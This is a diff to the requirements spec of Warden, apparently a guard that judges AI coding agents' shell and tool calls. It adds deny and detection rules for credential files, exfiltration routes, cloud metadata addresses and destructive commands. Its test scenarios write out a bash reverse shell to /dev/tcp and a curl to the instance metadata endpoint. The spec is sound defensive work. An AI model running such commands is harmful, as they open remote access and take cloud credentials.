@@ -107,7 +107,7 @@ The system SHALL turn an ask into a deny, with a note saying nobody is there to 
 
 ### Requirement: A command line is read as bash, every command inside it found
 
-The system SHALL read a shell command line with a complete bash parser and judge every simple command in it: those behind pipes, lists, subshells, blocks, loops and conditions; those inside `$(...)`, backticks and `<(...)`; those in the string of `bash -c`, `sh -c` and the like, and in the arguments of `eval`; and those behind `sudo`, `doas`, `env`, `nohup`, `nice`, `timeout`, `xargs`, `command`, `exec` and `find -exec`.
+The system SHALL read a shell command line with a complete bash parser and judge every simple command in it: those behind pipes, lists, subshells, blocks, loops and conditions; those inside `$(...)`, backticks and `<(...)`; those in the string of `bash -c`, `sh -c` and the like, and in the arguments of `eval`; and those behind `sudo`, `doas`, `env`, `nohup`, `nice`, `timeout`, `xargs`, `command`, `exec`, `flock`, `watch`, `strace`, `ltrace`, `unshare`, `chroot`, `busybox` and `find -exec`.
 
 #### Scenario: Nested commands
 
@@ -118,6 +118,11 @@ The system SHALL read a shell command line with a complete bash parser and judge
 
 - **WHEN** the line is `sudo -u root rm -rf /tmp/x`
 - **THEN** both `sudo` and `rm` are judged
+
+#### Scenario: Behind a lock
+
+- **WHEN** the line is `flock -w 5 /tmp/l kubectl delete ns prod`
+- **THEN** both `flock` and `kubectl` are judged and the call needs a person's approval
 
 #### Scenario: A name that is only known later
 
@@ -182,7 +187,7 @@ The system SHALL deny, in every profile that has no ask, text downloaded with `c
 
 ### Requirement: Credential files, secrets and the working scope are protected
 
-The system SHALL treat reading a credential file (the dotenv files but not their templates, `~/.ssh`, `~/.aws`, keys and certificates), a secret printed by a tool, the environment dumped, a secret variable expanded into a command and a credential typed into a command line as findings; and SHALL, when a policy sets a scope, treat a write outside it and outside `/tmp` as out of scope.
+The system SHALL treat reading a credential file (the dotenv files but not their templates, `~/.ssh`, `~/.aws`, keys and certificates, the system's password and sudo files, a process's environment under `/proc`, the credential files of PostgreSQL, Terraform, Vault, rclone, Cargo, Maven, Gradle and DigitalOcean, shell history, the saved logins of browsers, and Terraform state), a secret printed by a tool, the environment dumped, a secret variable expanded into a command and a credential typed into a command line as findings; and SHALL, when a policy sets a scope, treat a write outside it and outside `/tmp` as out of scope.
 
 #### Scenario: A template is readable
 
@@ -234,6 +239,42 @@ The system SHALL classify as `default_branch` a `git push` whose target is `main
 #### Scenario: A person's own session
 
 - **WHEN** a person runs `git push origin main` under the guarded profile
+
+### Requirement: Routes that carry data out of the machine are risky
+
+The system SHALL treat as exfiltration a `git push` to an address instead of a named remote, `ssh` with `-R` or `-D`, staging a credential file with `git add`, and moving or linking a credential file with `mv` or `ln`; and SHALL always deny a request to a cloud metadata address (`169.254.169.254`, `metadata.google.internal`, `metadata.azure.com`) or to a public request-capture or tunnelling service (`requestbin.net`, `pipedream.net`, `interact.sh`, `oast.fun`, `oast.pro`, `burpcollaborator.net`, beside those already listed).
+
+#### Scenario: Instance credentials
+
+- **WHEN** an agent runs `curl http://169.254.169.254/latest/meta-data/`
+- **THEN** the call is denied
+
+#### Scenario: A credential file is staged
+
+- **WHEN** an agent runs `git add .env`
+- **THEN** the call needs a person's approval
+
+#### Scenario: Ordinary git
+
+- **WHEN** an agent runs `git push origin main` or `git add src/main.rs`
+
+### Requirement: Commands that destroy hosted or shared state, and reverse shells, are risky
+
+The system SHALL classify as destructive `gh repo delete`, `gh repo archive`, `gh release delete`, `gh secret delete`, `gh api` with a DELETE method, `dropdb` and `dropuser`, `redis-cli` flushing and `mongosh` dropping a database, and `find -delete` over a path outside the workspace; as a change of privilege `gh secret set`; as a publish `npm unpublish`, `deprecate` and `dist-tag`; as a deletion `shred`; and as an exfiltration and a network access any redirect to `/dev/tcp` or `/dev/udp`, including the duplicating form `>& /dev/tcp/...`.
+
+#### Scenario: A repository is deleted
+
+- **WHEN** an agent runs `gh repo delete owner/name --yes` under the guarded profile
+- **THEN** the call needs a person's approval
+
+#### Scenario: A reverse shell
+
+- **WHEN** an agent runs `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` under the guarded profile
+- **THEN** the call is denied
+
+#### Scenario: Cleaning inside the workspace
+
+- **WHEN** an agent runs `find . -name '*.pyc' -delete` under the guarded profile
 - **THEN** the call is allowed
 
 ### Requirement: `warden explain` shows how a command is judged
@@ -334,6 +375,48 @@ The system SHALL print the number of records with the count of each decision (a 
 - **WHEN** `WARDEN_STATE_DIR` is set
 - **THEN** the log is read from its `audit` folder
 
+### Requirement: `warden report` says what a stricter profile would have stopped
+
+The system SHALL print, for the log in the policy's audit directory, `$WARDEN_STATE_DIR/audit` or `--dir`, and for one session with `--session`: how many calls were recorded, how many of them the policy intended to ask about or deny but audit mode let through, those counts per risk category, the commands that were stopped most often, and one closing line that says what share of the calls would have been stopped. It SHALL print nothing but that line, and exit successfully, for an empty log.
+
+#### Scenario: Observing before enforcing
+
+- **WHEN** the log holds ten calls in audit mode, two of which the policy intended to deny for `destructive`
+- **THEN** the report says two of ten would have been stopped and lists `destructive` with a count of two
+
+#### Scenario: An empty log
+
+- **WHEN** the log holds no record
+- **THEN** the report says there is nothing to report yet
+
+### Requirement: `status` and `report` can look at a recent period
+
+The system SHALL accept `--since <duration>` on `warden status` and `warden report`, a whole number followed by `m` (minutes), `h` (hours) or `d` (days), and then read only the records written in that period before now; and SHALL refuse any other form with a message that shows the accepted ones and exit with status 2.
+
+#### Scenario: Overnight
+
+- **WHEN** the log holds a record from three days ago and one from a minute ago and a person runs `warden report --since 12h`
+- **THEN** the report counts one call
+
+#### Scenario: A duration that cannot be read
+
+- **WHEN** a person runs `warden status --since tomorrow`
+- **THEN** the command refuses it, shows `30m`, `12h` and `7d` as examples and exits with status 2
+
+### Requirement: `warden report --json` gives the report to a program
+
+The system SHALL, with `--json`, print the report as one JSON object with the keys `records`, `calls`, `would_stop`, `by_category` (a map of category to count), `by_decision` (a map of the labels `status` shows to count) and `redactions` (a map of kind to count), and nothing else, also for an empty log, where every number is zero.
+
+#### Scenario: A program reads the report
+
+- **WHEN** the log holds five calls, three of which the policy intended to stop for `destructive`
+- **THEN** the object says `calls` is 5, `would_stop` is 3 and `by_category` has `destructive` at 3
+
+#### Scenario: An empty log
+
+- **WHEN** the log holds no record
+- **THEN** the object has every count at zero
+
 ### Requirement: `warden audit verify` exits with the verdict
 
 The system SHALL print that the chain is intact with its record and file counts and exit successfully, or print where it is broken and exit with status 1.
@@ -354,7 +437,7 @@ The system SHALL log by default to `~/.local/share/warden/audit`, let a policy t
 
 ### Requirement: Secrets and personal data become stable, reversible tokens
 
-The system SHALL replace credentials and personal data in text by tokens of the form `<KIND_n>`, the same value always getting the same token within a session and different values different numbers starting at 1 for each kind; SHALL recognise the credentials of the common providers (AWS, GitHub, GitLab, Slack, Google, Stripe, OpenAI and Anthropic keys, SendGrid, Twilio, npm, PyPI, Hugging Face and Doppler tokens, JSON web tokens, bearer tokens, basic-auth headers, passwords in URLs, `.npmrc` tokens, private key blocks and literals assigned to sensitive names such as `password` or `api_key`) and the personal data of email addresses, telephone numbers, IBANs (checked by their checksum), payment cards (checked with Luhn), French social security numbers (checked by their key), US social security numbers, public IPv4 addresses (only when asked), the names a policy lists and the patterns a policy defines; SHALL leave alone the values an allow list names; and SHALL put the real value back when asked to restore a text.
+The system SHALL replace credentials and personal data in text by tokens of the form `<KIND_n>`, the same value always getting the same token within a session and different values different numbers starting at 1 for each kind; SHALL recognise the credentials of the common providers (AWS, GitHub, GitLab, Slack, Google, Stripe, OpenAI and Anthropic keys, SendGrid, Twilio, npm, PyPI, Hugging Face and Doppler tokens, Slack and Discord webhook addresses, DigitalOcean, Shopify, Notion, Linear, Supabase, Sentry, Grafana, Postman, PlanetScale, Databricks, Fly, Docker Hub, Mailgun and Terraform Cloud tokens, age secret keys, Azure storage account keys, JSON web tokens, bearer tokens, basic-auth headers, passwords in URLs, `.npmrc` tokens, private key blocks and literals assigned to sensitive names such as `password` or `api_key`) and the personal data of email addresses, telephone numbers, IBANs (checked by their checksum), payment cards (checked with Luhn), French social security numbers (checked by their key), US social security numbers, public IPv4 addresses (only when asked), the names a policy lists and the patterns a policy defines; SHALL leave alone the values an allow list names; and SHALL put the real value back when asked to restore a text.
 
 #### Scenario: Same value, same token
 
@@ -715,12 +798,12 @@ The system SHALL publish, when a Warden release is made, a static binary for Lin
 
 ### Requirement: Codex, Copilot and OpenCode are guarded through their own adapters
 
-The system SHALL provide an adapter for the Codex CLI (the Claude Code payload, `apply_patch` read by the files its patch names whichever field holds the patch, and a question that Codex cannot ask passed on as context so that Codex's own approval flow runs, never as an `ask` that Codex would fail open on), for GitHub Copilot (both the camelCase payload whose `toolArgs` is a JSON string and the PascalCase payload, the decision as a top-level `permissionDecision`, an allow never sent so as not to approve what the person's own settings ask about, a prompt that cannot be blocked left unanswered) and for OpenCode (the events of a plugin Warden ships, answered in JSON the plugin acts on); and the hook SHALL use each agent as far as it lets a hook go: wrap a command and put token values back only where the agent accepts changed arguments, turn a rewrite the policy wants into a refusal that says what to run where it does not, redact the result after the tool ran where the agent lets a hook replace it, and refuse an MCP call that holds personal data where it cannot be replaced by tokens.
+The system SHALL provide an adapter for the Codex CLI (the Claude Code payload, `apply_patch` read by the files its patch names whichever field holds the patch, and a question that Codex cannot ask refused with the question as the reason, never sent as an `ask` that Codex would fail open on and never passed on as context that lets the call run), for GitHub Copilot (both the camelCase payload whose `toolArgs` is a JSON string and the PascalCase payload, the decision as a top-level `permissionDecision`, an allow never sent so as not to approve what the person's own settings ask about, a prompt that cannot be blocked left unanswered) and for OpenCode (the events of a plugin Warden ships, answered in JSON the plugin acts on); and the hook SHALL use each agent as far as it lets a hook go: wrap a command and put token values back only where the agent accepts changed arguments, turn a rewrite the policy wants into a refusal that says what to run where it does not, redact the result after the tool ran where the agent lets a hook replace it, and refuse an MCP call that holds personal data where it cannot be replaced by tokens.
 
 #### Scenario: Codex cannot ask
 
 - **WHEN** a command that `guarded` would ask about reaches the Codex hook
-- **THEN** the answer has no permission decision and carries the question as context
+- **THEN** the answer is a deny whose reason carries the question, the model sees that reason, and the command does not run
 
 #### Scenario: A Codex patch
 
